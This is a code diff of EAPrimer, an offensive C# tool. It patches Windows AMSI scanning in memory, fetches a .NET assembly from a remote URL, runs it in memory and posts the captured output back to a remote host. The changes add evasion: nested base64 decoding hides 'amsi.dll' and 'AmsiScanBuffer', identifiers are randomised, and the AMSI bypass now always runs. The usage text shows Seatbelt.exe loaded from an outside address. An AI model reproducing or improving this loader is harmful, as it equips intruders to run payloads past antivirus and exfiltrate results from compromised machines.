@@ -4,37 +4,31 @@ using System.Net;
 using System.Text;
 using System.Reflection;
 using System.Collections.Generic;
-using System.Collections.Specialized;
-
 using System.Runtime.InteropServices;
+
 namespace EAPrimer
 {
     public class Program
     {
-        [DllImport("ke" + "rne" + "l32")]
-        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32")]
+        private static extern IntPtr LoadLibrary(string G2fnKHkbz5Ab);
 
-        [DllImport("ke" + "rne" + "l32")]
-        private static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32")]
+        private static extern IntPtr GetProcAddress(IntPtr Tvsas, string GHKPCKME);
 
-        [DllImport("ke" + "rne" + "l32")]
-        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32")]
+        private static extern bool VirtualProtect(IntPtr fwmzpXgc, UIntPtr Jvcap, uint BnszP, out uint VSGeYhcbqdgQHCMH);
 
         private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
         {
             Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
         }
-        private static void ApplyMemoryPatch()
+        private static void Dispatch()
         {
-            // Help and resources:
-            // @chwagner
-            //https://github.com/rasta-mouse/AmsiScanBufferBypass/tree/master/ASBBypass
-            //https://github.com/Flangvik/NetLoader
-            // Thank you <3
             try
             {
-                var abc = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS" + "5kbGw=")));
-                IntPtr addr = GetProcAddress(abc, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5" + "CdWZmZXI=")));
+                var abc = LoadLibrary(Decoder("VjFaamVHVnRSbFJPVjNScFVqTmpPUT09", "bHad"));
+                IntPtr addr = GetProcAddress(abc, Decoder("VlZaamVHVnRSbGRVYlhCYVZucFdSRnBHWkdGaVZuQlpVMVF3UFE9PQ==", "pvnt"));
                 uint magicRastaValue = 0x40;
                 uint someNumber = 0;
 
@@ -60,7 +54,27 @@ namespace EAPrimer
             }
         }
 
-        static void ExecuteAssembly(string b64Assembly, string[] arguments)
+        static string Decoder(string bait, string snowgrant)
+        {
+            string moderncircle = bait;
+            for (int i = 0; i < snowgrant.Length; i++)
+            {
+                moderncircle = Encoding.UTF8.GetString(Convert.FromBase64String(moderncircle));
+            }
+            return moderncircle;
+        }
+
+        static string Encoder(string casper, string reactor)
+        {
+            string weaver = casper;
+            for (int i = 0; i < reactor.Length; i++)
+            {
+                weaver = Convert.ToBase64String(Encoding.UTF8.GetBytes(weaver));
+            }
+            return weaver;
+        }
+
+            static void ExecuteAssembly(string b64Assembly, string[] arguments)
         {
             var bytes = Convert.FromBase64String(b64Assembly);
             var target = Assembly.Load(bytes).EntryPoint;
@@ -127,37 +141,28 @@ namespace EAPrimer
                         Console.SetOut(origOut);
                     }
 
-                    //Verify Args
+                    Console.WriteLine("[*] EAPrimer v0.1.2");
                     if (arguments.Count < 1 || arguments.ContainsKey("-help") || !arguments.ContainsKey("-path"))
                     {
-                        Console.WriteLine("\n\t\t<----<< EAPrimer v0.1.1 >>---->");
-                        Console.WriteLine("Arguments");
-                        Console.WriteLine("-path                URL or local path to assembly");
-                        Console.WriteLine("-post                Local path for output or URL to POST base64 encoded results. Default: console output.");
-                        Console.WriteLine("-args                Add arguments for target assembly.");
-                        Console.WriteLine("-skip-amsi           Skip AMSI in memory patch.\n\n");
-                        Console.WriteLine("EAPrimer.exe -path=https://192.168.1.2/Seatbelt.exe -post=https://192.168.1.2 -args=\"-group=all\"\n\n");
+                        Console.WriteLine("\n-path\tURL or local path to assembly");
+                        Console.WriteLine("-post\tLocal path for output or URL to POST base64 encoded results. Default: console output.");
+                        Console.WriteLine("-args\tAdd arguments for target assembly.\n\n");
+                        Console.WriteLine("EAPrimer.exe -path=https://192.168.1.2/assembly.exe -post=https://192.168.1.2 -args=\"-arg1 example_value\"\n");
                     }
                     else
                     {
-                        if (arguments.ContainsKey("-skip-amsi"))
-                        {
-                            Console.WriteLine("[*] Applying In-Memory Patch");
-                            ApplyMemoryPatch();
+                        Console.WriteLine("[*] Applying In-Memory Patch");
+                        Dispatch();
 
-                        }
-
-                        // Setup Assembly Args
                         if (arguments.ContainsKey("-args"))
                         {
                             assemblyArgs = new String[] { arguments["-args"] };
                             Console.WriteLine("[*] Assembly Args: \"{0}\"", assemblyArgs);
                         }
 
-                        // Get Assembly
                         if (arguments["-path"].StartsWith("http://") || arguments["-path"].StartsWith("https://"))
                         {
-                            Console.WriteLine("[*] Loading Asembly from: {0}", arguments["-path"]);
+                            Console.WriteLine("[*] Loading Asembly: {0}", arguments["-path"]);
                             assemblyBytes = assemblyBytes = GetAssembly(arguments["-path"]);
                         }
                         else
@@ -166,22 +171,19 @@ namespace EAPrimer
                             assemblyBytes = File.ReadAllBytes(arguments["-path"]);
                         }
 
-                        // Execute assembly and capture output from "void" Main
                         b64Assembly = Convert.ToBase64String(assemblyBytes);
                         ExecuteAssembly(b64Assembly, assemblyArgs);
                     }
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("[-] EAPrimer Error: " + ex);
+                    Console.WriteLine("[!] " + ex);
                 }
 
-                // Collect Output
                 outputData = writer.GetStringBuilder().ToString();
                 writer.Flush();
                 Console.WriteLine(outputData);
 
-                // Post Results
                 Console.SetOut(origOut);
                 if (arguments.ContainsKey("-post"))
                 {
